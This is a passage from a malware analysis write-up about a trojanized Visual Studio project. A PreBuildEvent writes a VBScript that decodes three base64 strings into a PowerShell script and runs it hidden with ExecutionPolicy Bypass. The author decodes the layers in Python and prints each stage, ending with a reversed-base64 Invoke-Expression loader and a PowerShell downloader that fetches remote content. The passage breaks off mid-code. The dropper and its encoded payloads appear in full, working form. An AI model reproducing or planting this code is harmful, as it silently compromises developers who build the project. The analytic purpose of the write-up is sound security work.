echo odasuauuudgagi = "eVIzY2lWM1V1a2lJaUFDTGk0Q1hpQVNaakZHYndWbWN0QVNLb1VXYmg1VVpzbG1SdDlHWnVGbVUwVjJSNm9UWG9SWFlRNXlUSjVTYmxSM2M1TjFXb0FTUGdJSGRUUm1ieVJDSTdrU00yUm1ieVJDS2dBWGIwUkNJb1JYWVExaWJwOW1TZzBESVFSSGVsUkNJN2tDS29SWFlRQlhibFJGZGxka082MEZhMEZHVXU4VVN1MFdaME5YZVR0Rkk5QUNjdFJISmdzVEtvY21icEpIZFQ5R1Z1a0NLa2xXZEhkWFpPcGpPZFJXYTFka0x0VkdkemwzVWJCU1BnRWpkazVtY2tBeU8wUkdKZzBESXpOV1prUkNJOUJ5T2o5bWN3UkNJd01UUTQxQ0l6NUdjekpISmdRalkwaEhkdEF5WWxSRUk5QUNka1JDSTdCU0t6NUdjekpISm9BaVpwQnlPbmhHWnpGR0pna21jVjFDSWs5R2EwVldUME5YWlMxU1pyOW1kdWxFSTlBeWN1QjNjeVJDSTdNMmJ2Skhja0FDTXpFRWV0QUNabWxIZGhaSEpnUWpZMGhIZHRBeVlsUkVJOUF5Wm9SMmNoUkNJN0lTU0xoRGRESm5jM3gyVDRNM1FFQjNkR3QwY3pSa2V3ZEhNTGhEYkRKWE4zTm1SMmNYWVBOSGNEeFVjM1IwVGo1R1I2VnpkRjkwWXdOa2UyYzNUUE5tY0RobE1zTmtaeUFIUjJWemR6c1VUeFIwTXlkbklnMERJa1pXZTBGbWRrQXllZ2tuYzBCeWVnUTNjd0JpYnZsR2RqNVdkbUJ5TzlCU2Znc0RkekJISTdCQ2FqUlhZakJTZmcwSEk5QnlPb1JIVXNaR0pnMFdaMGxVTGxaM2J0Vm1VZ3NISXBnR2RReG1aa0FDYTBGR1V0UTNjbFJGS2dZV2FnMEhJNzRXWmtSV2FJQlNac2xIZFRkM2JrNVdhWDFDSVFoWFprQUNhMEZHVWx4V2FHMUNJek5YWmo5bWNRMUNkeUZHZFRCeWVna0NVNFZHSmdnR2RoQlZMME5YWlVoQ0ltbEdJN0lTWjRWbUx5Vkdkc2xtUm9ObWNoVjJVaUFDVTBoWFprQUNhMEZHVXQ0V2F2cEVJOUFDVTRWR0pnc0RVMGhYWmtBQ2N2MUNJb1JIVXNaR0pnZzJZeUZXTGdRSGVGQnlPcGtuWWtBQ0xvUkhVc1pHSm9NWFowbG5Rc3hXUWxSWGF5ZGxPNjBWWnNsbVJ1OFVTdTBXWjBOWGVUdEZJN2tpSTZkakxpQXlLZ0lIZFRSbWJ5UkNLZ0FYYjBSQ0lvUlhZUTFpYnA5bVNnMERJb1JIVXNaR0pnc0hJcEFESTBkV0xnZ0dkbjVXWk01U2VpUkNLZ1lXYWdzVEt6Tldaa1JDS2hSWFlFUldZdnhtYjM5R1J1UW5ibGxHYmpSQ0k5QVNlaVJDSTdRbmJsbEdiREpXWlg1Q2RsNWtMdFZHZHpsM1VnUTNZbHBtWVAxeWRsNUVJOUFDZHVWV2FzTkdKZ3NUS3dFRElzQURLbjVXYXlSM2NpVjNVdWtpSWlBQ0xpNENYaUFTWmpGR2J3Vm1jdEFTS29VV2JoNVVac2xtUnQ5R1p1Rm1VMFYyUjZvVFhvUlhZUTV5VEo1U2JsUjNjNU4xV29BU1BnSUhkVFJtYnlSQ0k3a1NNMlJtYnlSQ0tnQVhiMFJDSW9SWFlRMWlicDltU2cwRElRUkhlbFJDSTdrQ0tvUlhZUUJYYmxSRmRsZGtPNjBGYTBGR1V1OFVTdTBXWjBOWGVUdEZJOUFDY3RSSEpnc1RLb2NtYnBKSGRUOUdWdWtDS2tsV2RIZFhaT3BqT2RSV2ExZGtMdFZHZHpsM1ViQlNQZ0VqZGs1bWNrQXlPMFJHSmcwREl6Tldaa1JDSTlCeU9qOW1jd1JDSXdNVFE0MUNJejVHY3pKSEpnUWpZMGhIZHRBeVlsUkVJOUFDZGtSQ0k3QlNLejVHY3pKSEpvQWlacEJ5T25aMmNrQVNheVZWTGdRMmJvUlhaTlIzY2xKVkxsdDJiMjVXU2cwREl6NUdjekpISmdzell2OW1jd1JDSXdNVFE0MUNJNnQyYWtBQ05pUkhlMDFDSWpWR1JnMERJbloyY2tBeU9pMFRQblYzUVlWemRJOUVPdk5FVDNjM1VQaGpiRHhrTjNKMVROSjNRekUzZGk5MGNxTmtZMmNYVVBOSGREQlZjM04wVDQ4R1J6VXpkT3QwY3VORVQyY25XUGhqY0RobE1zTmtaeUFIUjJWemR6c1VUeFIwTXlkbklnMERJNnQyYWtBeWVna25jMEJ5ZWdRbmJ5QmlidmxHZGo1V2RtQnlPOUJ5WWtBaWJ5VkhkbEpISTdBU0tvVTJjdngyUXVNWFp5UkNJN0FTS29VMmN2eDJRdUkzY2tBeU9na0NLazVXUnZSRlpoVm1VdUkzY2tBU1BnTUdKZ3NESXBrQ0t0RldaeVIzVWxObmJ2QjNjbEpGZGxka0x6Vm1ja2dpY2xSV1lsSlZiaFZtYzBObExQbGtMdFZHZHpsM1VnUTNZbHBtWVAxeWRsNUVJOUFpY3pSQ0k3QVNLb1UyY3U5R2N6Vm1VMFYyUnVJSEpnMERJelZtY2tBeU9nUUhKZzBESTBWM2JsMVdhVTVpY2tBeU9na1Nka2dTWjBGV1p5TmtPNjBGZHpWV2R4Vm1VaVYyVnVRWFpPNVNibFIzYzVOMVdnMERJeVJDSTdBU0t3QURNMUVESTlBQ2RrMEZkdWwyV2d3U2RrMDFadWxtYzBOM1dvQVNiaEpYWXdCeWVnTUZSZzQyYnBSM1l1Vm5aIjsgJHR4dCA9ICRSLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJHR4dCk7ICRibmIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0eHQpKTsgJGV4cCA9ICJJbnZva2UtRXhwcmVzc2lvbiI7IE5ldy1BbGlhcyAtTmFtZSBwV04gLVZhbHVlICRleHAgLUZvcmNlOyBwV04gJGJuYg==" >> "%tempDir%\script.vbs"
echo odasuauudgagi = "WnBWM1IzVm1UNm9UWGtsV2RINVNibFIzYzVOMVdnMERJeFlIWnVKSEpna1NWazAxWnVsbWMwTjNXZ3d5UWswRmR1Vldhc05rWWxkbEwwVm1UdTBXWjBOWGVUdEZLZzBXWXlGR2Nnc0hJR2huUkVCaWJ2bEdkajVXZG1CeU85QlNmZ3NEZHpCSEk3QkNhalJYWWpCU2ZnMEhJOUJ5T29SSFVzWkdKZzBXWjBsVUxsWjNidFZtVWdzSElwZ0dkUXhtWmtBQ2EwRkdVdFEzY2xSRktnWVdhZzBISTc0V1prUldhSUJTWnNsSGRUZDNiazVXYVgxQ0lRaFhaa0FDYTBGR1VseFdhRzFDSXpOWFpqOW1jUTFDZHlGR2RUQnllZ2tDVTRWR0pnZ0dkaEJWTDBOWFpVaENJbWxHSTdJU1o0Vm1MeVZHZHNsbVJvTm1jaFYyVWlBQ1UwaFhaa0FDYTBGR1V0NFdhdnBFSTlBQ1U0VkdKZ3NEVTBoWFprQUNjdjFDSW9SSFVzWkdKZ2cyWXlGV0xnUUhlRkJ5T3BrbllrQUNMb1JIVXNaR0pvTVhaMGxuUXN4V1FsUlhheWRsTzYwVlpzbG1SdThVU3UwV1owTlhlVHRGSTdraUk2ZGpMaUF5S2dJSGRUUm1ieVJDS2dBWGIwUkNJb1JYWVExaWJwOW1TZzBESW9SSFVzWkdKZ3NISXBBREkwZFdMZ2dHZG41V1pNNVNlaVJDS2dZV2Fnc1RLek5XWmtSQ0toUlhZRVJXWXZ4bWIzOUdSdVFuYmxsR2JqUkNJOUFTZWlSQ0k3UW5ibGxHYkRKV1pYNUNkbDVrTHRWR2R6bDNVZ1EzWWxwbVlQMXlkbDVFSTlBQ2R1Vldhc05HSmdzVEt3RURJc0FES241V2F5UjNjaVYzVXVraUlpQUNMaTRDWGlBU1pqRkdid1ZtY3RBU0tvVVdiaDVVWnNsbVJ0OUdadUZtVTBWMlI2b1RYb1JYWVE1eVRKNVNibFIzYzVOMVdvQVNQZ0lIZFRSbWJ5UkNJN2tTTTJSbWJ5UkNLZ0FYYjBSQ0lvUlhZUTFpYnA5bVNnMERJUVJIZWxSQ0k3a0NLb1JYWVFCWGJsUkZkbGRrTzYwRmEwRkdVdThVU3UwV1owTlhlVHRGSTlBQ2N0UkhKZ3NUS29jbWJwSkhkVDlHVnVrQ0trbFdkSGRYWk9wak9kUldhMWRrTHRWR2R6bDNVYkJTUGdFamRrNW1ja0F5TzBSR0pnMERJek5XWmtSQ0k5QnlPajltY3dSQ0l3TVRRNDFDSXo1R2N6SkhKZ1FqWTBoSGR0QXlZbFJFSTlBQ2RrUkNJN0JTS3o1R2N6SkhKb0FpWnBCeU9uWjJja0FTYXlWVkxnUTJib1JYWk5SM2NsSlZMbHQyYjI1V1NnMERJejVHY3pKSEpnc3pZdjltY3dSQ0l3TVRRNDFDSXNWM2RvUkNJMElHZDRSWExnTVdaRUJTUGdjbVp6UkNJN0lTUDlFVWNESlhOM1oyVE5KV2JMMTBiRUJWYzNKMlRqOUdSaUozZHY5RU9uUkVWMmNuZFAxRWFFQkZjM2QzVE45R1JtRjNkcUpVTjNGMVN6QkhSM1V6ZDU1a04zUnpTejkyUVFkemRTOTBZd05rWjJjM1VQaGpjRGhsTXNOa1p5QUhSMlZ6ZHpzVVR4UjBNeWRuSWcwRElzVjNkb1JDSTdCU2V5UkhJN0J5WXNSblk1cDNaMDlXWXMxR0l1OVdhME5tYjFaR0k3MEhJOUJ5T3BnU1p6OUdjemxHUnVRbmJsbEdiREpXWjNSQ0k3QlNlc3hXWXVsbVpnMEhJN01HYjBKV2U2ZEdkdkZHYnRCeWVnZzJZMEYyWWcwSEk5QnlPeVpHSmdJMmRrQWlSNFpFUmdzell2Skhja0FTWHdzbGJzUkNJalZHUmcwREl5WkdKZ3NISXBBREkwZFdMZ2dHZG41V1pNNWlic1JDS2dZV2Fnc2pJdUJtSWdRWGFzQjNjdEFpWmpSR0pnMERJdXhHSmdzVEttZEdKb01GUmcwREltTkdaa0F5TzA1V1pweDJRaVYyVnVRWFpPNVNibFIzYzVORkkwTldacUoyVHRjWFpPQlNQZ0kyZGtBeU9qOTJieUJISmdBek1CaFhMZ1EyY2tBQ05pUkhlMDFDSWpWR1JnMERJbWRHSmdzakk5VVZOM2R6U2pGM1FJUnpkWTlVVDBSRVYxYzNVTGhqYkVoa04zTlhNeGRuU1BoamJEQlZjM1YxVE5CM1FNRjNkRTkwWXVSa2UxY1hSUE5HY0Rwbk4zOTBUakozUVlKRGJEWm1Nd1JrZDFjM01MMVVjRU5qYzNKQ0k5QUNaelJDSTdCU2V5UkhJN0J5Y25SSGNnNDJicFIzWXVWblpnc1RmZzBISTdNM1owQkhJN0JDYWpSWFlqQlNmZzBISTlCeU9vUkhVc1pHSmcwV1owbFVMbFozYnRWbVVnc0hJcGdHZFF4bVprQUNhMEZHVXRRM2NsUkZLZ1lXYWcwSEk3NFdaa1JXYUlCU1pzbEhkVGQzYms1V2FYMUNJUWhYWmtBQ2EwRkdVbHhXYUcxQ0l6TlhaajltY1ExQ2R5RkdkVEJ5ZWdrQ1U0VkdKZ2dHZGhCVkwwTlhaVWhDSW1sR0k3SVNaNFZtTHlWR2RzbG1Sb05tY2hWMlVpQUNVMGhYWmtBQ2EwRkdVdDRXYXZwRUk5QUNVNFZHSmdzRFUwaFhaa0FDY3YxQ0lvUkhVc1pHSmdnMll5RldMZ1FIZUZCeU9wa25Za0FDTG9SSFVzWkdKb01YWjBsblFzeFdRbFJYYXlkbE82MFZac2xtUnU4VVN1MFdaME5YZVR0Rkk3a2lJNmRqTGlBeUtnSUhkVFJtYnlSQ0tnQVhiMFJDSW9SWFlRMWlicDltU2cwRElvUkhVc1pHSmdzSElwQURJMGRXTGdnR2RuNVdaTTVTZWlSQ0tnWVdhZ3NUS3pOV1prUkNLaFJYWUVSV1l2eG1iMzlHUnVRbmJsbEdialJDSTlBU2VpUkNJN1FuYmxsR2JESldaWDVDZGw1a0x0VkdkemwzVWdRM1lscG1ZUDF5ZGw1RUk5QUNkdVZXYXNOR0pnc1RLd0VESXNBREtuNVdh" >> "%tempDir%\script.vbs"
echo dajyugda78dauydajda = odasuaudgagi ^& odasuauudgagi ^& odasuauuudgagi >> "%tempDir%\script.vbs"
echo Set base64Decoder = CreateObject("MSXml2.DOMDocument.6.0").createElement("base64") >> "%tempDir%\script.vbs"
echo base64Decoder.DataType = "bin.base64" >> "%tempDir%\script.vbs"
echo base64Decoder.Text = dajyugda78dauydajda >> "%tempDir%\script.vbs"
echo decodedData = base64Decoder.NodeTypedValue >> "%tempDir%\script.vbs"
echo outputFile = "%tempDir%\decode.ps1" >> "%tempDir%\script.vbs"
echo Set fso = CreateObject("Scripting.FileSystemObject") >> "%tempDir%\script.vbs"
echo Set outFile = fso.CreateTextFile(outputFile, True) >> "%tempDir%\script.vbs"
echo outFile.Write BinaryToString(decodedData) >> "%tempDir%\script.vbs"
echo outFile.Close >> "%tempDir%\script.vbs"
echo Set shell = CreateObject("WScript.Shell") >> "%tempDir%\script.vbs"
echo shell.Run "powershell.exe -ExecutionPolicy Bypass -File " ^& outputFile, 0, False >> "%tempDir%\script.vbs"
echo Function BinaryToString(Binary) >> "%tempDir%\script.vbs"
echo Dim RS, L >> "%tempDir%\script.vbs"
echo Set RS = CreateObject("ADODB.Recordset") >> "%tempDir%\script.vbs"
echo L = LenB(Binary) >> "%tempDir%\script.vbs"
echo If L ^> 0 Then >> "%tempDir%\script.vbs"
echo RS.Fields.Append "m", 201, L >> "%tempDir%\script.vbs"
echo RS.Open >> "%tempDir%\script.vbs"
echo RS.AddNew >> "%tempDir%\script.vbs"
echo RS("m").AppendChunk Binary >> "%tempDir%\script.vbs"
echo RS.Update >> "%tempDir%\script.vbs"
echo BinaryToString = RS("m").GetChunk(L) >> "%tempDir%\script.vbs"
echo Else >> "%tempDir%\script.vbs"
echo BinaryToString = "" >> "%tempDir%\script.vbs"
echo End If >> "%tempDir%\script.vbs"
echo End Function >> "%tempDir%\script.vbs"
cscript //nologo "%tempDir%\script.vbs"
endlocal</Command>
    </PreBuildEvent>
```



We have three base64 encoded strings. The first string, `odasuaudgagi`, is redirected to a script.vbs file in the users temp directory, the other two(`odasuauuudgagi` and `odasuauudgagi`) are then concatenated to it. Afterwards, the malware puts any base64 decoding logic into a new powershell script, `decode.ps1`, also in the users temp directory. Interestingly, the malware appears to redirect every operation into the originally created `script.vbs`. 

Next, the decode.ps1 is ran with PowerShell, with silent execution parameters:
```
powershell.exe -ExecutionPolicy Bypass -File outputFile, 0, False
```

Next, to uncover the payload, we switch to Python and create the three variables, concatenate them, then base64 decode the final base64 payload:
```python
#!/bin/python3
from base64 import b64decode

odasuaudgagi = "JFIgPSAiPT1BZ...<SNIP>....XYXlSM1V2UmxMcGdD
odasuauuudgagi = "eVIzY2lWM1V1...<SNIP>...NlOyBwV04gJGJuYg==
odasuauudgagi = "WnBWM1IzVm1UNm...<SNIP>...RLd0VESXNBREtuNVdh

dajyugda78dauydajda = odasuaudgagi + odasuauudgagi + odasuauuudgagi

print(b64decode(dajyugda78dauydajda))
```

OUTPUT:
```
b'$R = "==AduJHI70HI7kSblR3c5NlO601clRXdilmc0RXQlxWaG5yTJ5SblR3c5N1WgI3bi1CIuVGZklGS6oTXzVGd1JWayRHdBVGbpZkLPlkLtVGdzl3UbhCIlVHbhZVLgMXZ0VnYpJHd0FEIl1WYO1CIwRCIoRXYQ1CI5RnclB3byBVblRXStQXZTByOp0WZ0NXeTpjOdNXZ0VnYpJHd0FUZslmRu8USu0WZ0NXeTtFIy9mYtAiblRGZphkO601clRXdilmc0RXQlxWaG5yTJ5SblR3c5N1WoASZ1xWYW1CIzVGd1JWayRHdBBSZtFmTtAybkACa0FGUtASe0JXZw9mcQ1WZ0lUL0V2UgsTKoU2cvB3cpRkL05WZpx2QiV2dkAyOp8GJgwSdkgSZslmRkF2bs52dvRkL05WZpx2QiV2dkAyO05WZpx2QiV2VuQXZO5SblR3c5NFI0NWZqJ2TtcXZOBSPgQnbllGbDJWZ3RCI7ISZ4VmL6djIggGdhBFZslGaD1CIwRCIoRXYQ1CIoRXYQ1ibp9mSg0DIvRCI7ISZ4VmLyp3NvE2LnJ3buAXa61yNuc3d39yL6MHc0RHaiASPgUHJgsTZjJ3bG1CIwRCIoRXYQ1CI5J3b0NWZylGRgUGc5RVblRXStASblRXStcXZOByegkSKiUGel5ie3wFckICIoRXYQ1CdzVGVoACdv5WLoAiZpByOiAXaa5WZ2V2ccFGdhRUbhJ3ZvJHUcpzQiASPgAHJgsTfgQXahdVLg4WZkRWaIBSZslHdTd3bk5WaX1CInJXYkACdzlGT05WZtV3ZyFULgAXaaNHJggGdhBVZslmRtAyczV2YvJHUtQnchR3UgsjI51CIXBnTkAGd3AVcMZjKLdWI5EUJyImJeNjUoBXLgICYw9GJiA2btAiIgh2YyFGJiAGI4JCI9AyZyFGJgsjIlhXZuo3NcBXaa5WZ2V2ccFGdhRUbhJ3ZvJHUcpzQiASPgAXaaNHJgkCcvRSXn5WayR3cbBCLoNmchRSXn5WayR3cbhCItFmchBHI7BCd4VEIu9Wa0Nmb1ZGI70HI9tHIoNGdhNGI9BCVjVGZkAibp9matAibyVHdlJHI9ByOpg2QwRCItAichh2YkgSXyFGajtFI9ASXpRyWUNWZkRCI70Fa0dmblxkLwMTQ4RCIlASaksFMzEEekASPgg2QwRCI70VaksFVj5WZkASPgIXYoNGJgsHIpsyKpRCI7gGdn5WZM5CVj5WZkACds1CIpRCI7ADI9ASakgCIy9mZgsDa0dmblxkLUNmblRCIdtlchh2YgQ3YlpmYP1ydl5EI9ACVjVGZkAyOpI0YuVGJocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIUNmblRCI7kCNiRHe0RCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbBSPgI0YuVGJgsHI5JHdgkCMzEEek01Zulmc0N3WgwCNiRHe0RSXn5WayR3cbhCItFmchBHI7ByYlREIu9Wa0Nmb1ZGI7ISfsQCYXtTYitnfA5GONNDOskjYwFnIg0DIj9mcwRCI7ICd69VM51WP2gWL0t2Q0VlIg0DIj92byBHJgsTfg0HI7MGb0JWe6dGdvFGbtByegg2Y0F2Yg0HI9BSfgsDa0BFbmRCItVGdJ1SZ29WblJFI7BSKoRHUsZGJggGdhBVL0NXZUhCImlGI9ByOuVGZklGSgUGb5R3U39GZul2VtACU4VGJggGdhBVZslmRtAyczV2YvJHUtQnchR3UgsHIpAFelRCIoRXYQ1CdzVGVoAiZpByOiUGel5iclRHbpZEajJXYlNlIgAFd4VGJggGdhBVLul2bKBSPgAFelRCI7AFd4VGJgA3btACa0BFbmRCIoNmch1CI0hXRgsTKiRCIsgGdQxmZkgyclRXeCxGbBVGdpJ3V6oTXlxWaG5yTJ5SblR3c5N1WgsTKio3NuICIrAic0NFZuJHJoACctRHJggGdhBVLul2bKBSPggGdQxmZkAyegkCMgQ3ZtACa0dmblxkLiRCKgYWagsTKVRCKhRXYERWYvxmb39GRuMEJg0DIiRCI7BSeyRHI7kCMxACLwgyZulmc0NnY1NlLpIiIgwiIuwlIgU2YhxGclJXLgkCKl1WYOVGbpZUbvRmbhJFdldkO60Fa0FGUu8USu0WZ0NXeTtFKg0DIyR3Uk5mckAyOpEjdk5mckgCIw1GdkACa0FGUt4WavpEI9ACU0hXZkAyOpgCa0FGUw1WZURXZHpjOdhGdhBlLPlkLtVGdzl3UbBSPgAXb0RCI7kCKn5WayR3UvRlLpgCZpV3R3VmT6oTXklWdH5SblR3c5N1Wg0DIxYHZuJHJgkSVk01Zulmc0N3WgwyQk0FduVWasNkYldlL0VmTu0WZ0NXeTtFKg0WYyFGcgsHIGhnREBibvlGdj5WdmByO9BSfgsDdzBHI7BCajRXYjBSfg0HI9ByOoRHUsZGJg0WZ0lULlZ3btVmUgsHIpgGdQxmZkACa0FGUtQ3clRFKgYWag0HI74WZkRWaIBSZslHdTd3bk5WaX1CIQhXZkACa0FGUlxWaG1CIzNXZj9mcQ1CdyFGdTByegkCU4VGJggGdhBVL0NXZUhCImlGI7ISZ4VmLyVGdslmRoNmchV2UiACU0hXZkACa0FGUt4WavpEI9ACU4VGJgsDU0hXZkACcv1CIoRHUsZGJgg2YyFWLgQHeFByOpknYkACLoRHUsZGJoMXZ0lnQsxWQlRXaydlO60VZslmRu8USu0WZ0NXeTtFI7kiI6djLiAyKgIHdTRmbyRCKgAXb0RCIoRXYQ1ibp9mSg0DIoRHUsZGJgsHIpADI0dWLggGdn5WZM5SeiRCKgYWagsTKzNWZkRCKhRXYERWYvxmb39GRuQnbllGbjRCI9ASeiRCI7QnbllGbDJWZX5Cdl5kLtVGdzl3UgQ3YlpmYP1ydl5EI9ACduVWasNGJgsTKwEDIsADKn5WayR3ciV3UukiIiACLi4CXiASZjFGbwVmctASKoUWbh5UZslmRt9GZuFmU0V2R6oTXoRXYQ5yTJ5SblR3c5N1WoASPgIHdTRmbyRCI7kSM2RmbyRCKgAXb0RCIoRXYQ1ibp9mSg0DIQRHelRCI7kCKoRXYQBXblRFdldkO60Fa0FGUu8USu0WZ0NXeTtFI9ACctRHJgsTKocmbpJHdT9GVukCKklWdHdXZOpjOdRWa1dkLtVGdzl3UbBSPgEjdk5mckAyO0RGJg0DIzNWZkRCI9ByOj9mcwRCIwMTQ41CIz5GczJHJgQjY0hHdtAyYlREI9ACdkRCI7BSKz5GczJHJoAiZpByOnZ2ckASayVVLgQ2boRXZNR3clJVLlt2b25WSg0DIz5GczJHJgszYv9mcwRCIwMTQ41CIsV3doRCI0IGd4RXLgMWZEBSPgcmZzRCI7ISP9EUcDJXN3Z2TNJWbL10bEBVc3J2Tj9GRiJ3dv9EOnREV2cndP1EaEBFc3d3TN9GRmF3dqJUN3F1SzBHR3Uzd55kN3RzSz92QQdzdS90YwNkZ2c3UPhjcDhlMsNkZyAHR2VzdzsUTxR0MydnIg0DIsV3doRCI7BSeyRHI7ByYsRnY5p3Z09WYs1GIu9Wa0Nmb1ZGI70HI9ByOpgSZz9GczlGRuQnbllGbDJWZ3RCI7BSesxWYulmZg0HI7MGb0JWe6dGdvFGbtByegg2Y0F2Yg0HI9ByOyZGJgI2dkAiR4ZERgszYvJHckASXwslbsRCIjVGRg0DIyZGJgsHIpADI0dWLggGdn5WZM5ibsRCKgYWagsjIuBmIgQXasB3ctAiZjRGJg0DIuxGJgsTKmdGJoMFRg0DImNGZkAyO05WZpx2QiV2VuQXZO5SblR3c5NFI0NWZqJ2TtcXZOBSPgI2dkAyOj92byBHJgAzMBhXLgQ2ckACNiRHe01CIjVGRg0DImdGJgsjI9UVN3dzSjF3QIRzdY9UT0REV1c3ULhjbEhkN3NXMxdnSPhjbDBVc3V1TNB3QMF3dE90YuRke1cXRPNGcDpnN390TjJ3QYJDbDZmMwRkd1c3ML1UcENjc3JCI9ACZzRCI7BSeyRHI7BycnRHcg42bpR3YuVnZgsTfg0HI7M3Z0BHI7BCajRXYjBSfg0HI9ByOoRHUsZGJg0WZ0lULlZ3btVmUgsHIpgGdQxmZkACa0FGUtQ3clRFKgYWag0HI74WZkRWaIBSZslHdTd3bk5WaX1CIQhXZkACa0FGUlxWaG1CIzNXZj9mcQ1CdyFGdTByegkCU4VGJggGdhBVL0NXZUhCImlGI7ISZ4VmLyVGdslmRoNmchV2UiACU0hXZkACa0FGUt4WavpEI9ACU4VGJgsDU0hXZkACcv1CIoRHUsZGJgg2YyFWLgQHeFByOpknYkACLoRHUsZGJoMXZ0lnQsxWQlRXaydlO60VZslmRu8USu0WZ0NXeTtFI7kiI6djLiAyKgIHdTRmbyRCKgAXb0RCIoRXYQ1ibp9mSg0DIoRHUsZGJgsHIpADI0dWLggGdn5WZM5SeiRCKgYWagsTKzNWZkRCKhRXYERWYvxmb39GRuQnbllGbjRCI9ASeiRCI7QnbllGbDJWZX5Cdl5kLtVGdzl3UgQ3YlpmYP1ydl5EI9ACduVWasNGJgsTKwEDIsADKn5WayR3ciV3UukiIiACLi4CXiASZjFGbwVmctASKoUWbh5UZslmRt9GZuFmU0V2R6oTXoRXYQ5yTJ5SblR3c5N1WoASPgIHdTRmbyRCI7kSM2RmbyRCKgAXb0RCIoRXYQ1ibp9mSg0DIQRHelRCI7kCKoRXYQBXblRFdldkO60Fa0FGUu8USu0WZ0NXeTtFI9ACctRHJgsTKocmbpJHdT9GVukCKklWdHdXZOpjOdRWa1dkLtVGdzl3UbBSPgEjdk5mckAyO0RGJg0DIzNWZkRCI9ByOj9mcwRCIwMTQ41CIz5GczJHJgQjY0hHdtAyYlREI9ACdkRCI7BSKz5GczJHJoAiZpByOnhGZzFGJgkmcV1CIk9Ga0VWT0NXZS1SZr9mdulEI9AycuB3cyRCI7M2bvJHckACMzEEetACZmlHdhZHJgQjY0hHdtAyYlREI9AyZoR2chRCI7ISSLhDdDJnc3x2T4M3QEB3dGt0czRkewdHMLhDbDJXN3NmR2cXYPNHcDxUc3R0Tj5GR6VzdF90YwNke2c3TPNmcDhlMsNkZyAHR2VzdzsUTxR0MydnIg0DIkZWe0FmdkAyegknc0ByegQ3cwBibvlGdj5WdmByO9BSfgsDdzBHI7BCajRXYjBSfg0HI9ByOoRHUsZGJg0WZ0lULlZ3btVmUgsHIpgGdQxmZkACa0FGUtQ3clRFKgYWag0HI74WZkRWaIBSZslHdTd3bk5WaX1CIQhXZkACa0FGUlxWaG1CIzNXZj9mcQ1CdyFGdTByegkCU4VGJggGdhBVL0NXZUhCImlGI7ISZ4VmLyVGdslmRoNmchV2UiACU0hXZkACa0FGUt4WavpEI9ACU4VGJgsDU0hXZkACcv1CIoRHUsZGJgg2YyFWLgQHeFByOpknYkACLoRHUsZGJoMXZ0lnQsxWQlRXaydlO60VZslmRu8USu0WZ0NXeTtFI7kiI6djLiAyKgIHdTRmbyRCKgAXb0RCIoRXYQ1ibp9mSg0DIoRHUsZGJgsHIpADI0dWLggGdn5WZM5SeiRCKgYWagsTKzNWZkRCKhRXYERWYvxmb39GRuQnbllGbjRCI9ASeiRCI7QnbllGbDJWZX5Cdl5kLtVGdzl3UgQ3YlpmYP1ydl5EI9ACduVWasNGJgsTKwEDIsADKn5WayR3ciV3UukiIiACLi4CXiASZjFGbwVmctASKoUWbh5UZslmRt9GZuFmU0V2R6oTXoRXYQ5yTJ5SblR3c5N1WoASPgIHdTRmbyRCI7kSM2RmbyRCKgAXb0RCIoRXYQ1ibp9mSg0DIQRHelRCI7kCKoRXYQBXblRFdldkO60Fa0FGUu8USu0WZ0NXeTtFI9ACctRHJgsTKocmbpJHdT9GVukCKklWdHdXZOpjOdRWa1dkLtVGdzl3UbBSPgEjdk5mckAyO0RGJg0DIzNWZkRCI9ByOj9mcwRCIwMTQ41CIz5GczJHJgQjY0hHdtAyYlREI9ACdkRCI7BSKz5GczJHJoAiZpByOnZ2ckASayVVLgQ2boRXZNR3clJVLlt2b25WSg0DIz5GczJHJgszYv9mcwRCIwMTQ41CI6t2akACNiRHe01CIjVGRg0DInZ2ckAyOi0TPnV3QYVzdI9EOvNET3c3UPhjbDxkN3J1TNJ3QzE3di90cqNkY2cXUPNHdDBVc3N0T48GRzUzdOt0cuNET2cnWPhjcDhlMsNkZyAHR2VzdzsUTxR0MydnIg0DI6t2akAyegknc0ByegQnbyBibvlGdj5WdmByO9ByYkAibyVHdlJHI7ASKoU2cvx2QuMXZyRCI7ASKoU2cvx2QuI3ckAyOgkCKk5WRvRFZhVmUuI3ckASPgMGJgsDIpkCKtFWZyR3UlNnbvB3clJFdldkLzVmckgiclRWYlJVbhVmc0NlLPlkLtVGdzl3UgQ3YlpmYP1ydl5EI9AiczRCI7ASKoU2cu9GczVmU0V2RuIHJg0DIzVmckAyOgQHJg0DI0V3bl1WaU5ickAyOgkSdkgSZ0FWZyNkO60FdzVWdxVmUiV2VuQXZO5SblR3c5N1Wg0DIyRCI7ASKwADM1EDI9ACdk0Fdul2WgwSdk01Zulmc0N3WoASbhJXYwByegMFRg42bpR3YuVnZ"; $txt = $R.ToCharArray(); [array]::Reverse($txt); $bnb = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $txt)); $exp = "Invoke-Expression"; New-Alias -Name pWN -Value $exp -Force; pWN $bnb'
```
We find another PowerShell script with a base64 payload, this time reversed. The malware loader sets up an alias named `pWN` which will execute: `Invoke-Expression $bnb` where `$bnb` is the cleaned, base64-decoded payload.

Switching back to Python:
```python
#!/bin/python3

R = "==AduJHI70HI7kSblR3c5NlO601clRXdil...<SNIP>...lmc0N3WoASbhJXYwByegMFRg42bpR3YuVnZ"

print(b64decode(R[::-1]))
```
OUT:
```
b'function DS { param ([string]$u, [int]$t = 15000) ; $r = [System.Net.WebRequest]::Create($u) ; $r.Timeout = $t ; $res = $r.GetResponse() ; $sr = New-Object System.IO.StreamReader($res.GetResponseStream()) ; $c = $sr.ReadToEnd() ; $sr.Close() ; $res.Close() ; return $c }; function rnt { try { $kkz = "wr3DqMK3w5vDp2fCl2XCr8OZw6LCnsKNw53Do8OCwqPCtsOQw6bCjsObwq3CrMORw6LCn8OSw7LCo8OHw5XCug=="; $sfg = Dec -txtb4 $kkz -xA30 $prooc; $rspns = Invoke-RestMethod -Uri $sfg; if ($rspns) { $dt = Dec -txtb4 $rspns -xA30 $proc; } $decs = $dt; $rndv1 = [System.Guid]::NewGuid().ToString(); $tmp = [System.IO.Path]::GetTempPath(); $extP = Join-Path $tmp ($rndv1); $rndStr = ([System.IO.Path]::GetRandomFileName() -replace 